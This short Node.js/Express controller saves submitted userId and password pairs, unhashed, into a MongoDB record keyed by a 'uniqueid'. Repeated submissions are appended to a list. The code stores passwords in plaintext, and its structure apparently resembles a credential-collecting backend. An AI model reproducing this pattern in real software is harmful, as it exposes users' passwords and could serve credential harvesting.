const Accept1 = require('../models/Accept1');

exports.createAccept1 = async (req, res) => {
  const { userId, password, uniqueid } = req.body;

  if (!userId || !password || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }

  try {
    let accept1 = await Accept1.findOne({ uniqueid });
    if (accept1) {
      // Optional: decide if you want to allow multiple Accept1 submissions.
      accept1.entries.push({ userId, password });
    } else {
      accept1 = new Accept1({
        uniqueid,
        entries: [{ userId, password }]
      });
    }

    await accept1.save();

    return res.status(201).json({
      success: true,
      message: 'Accept1 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
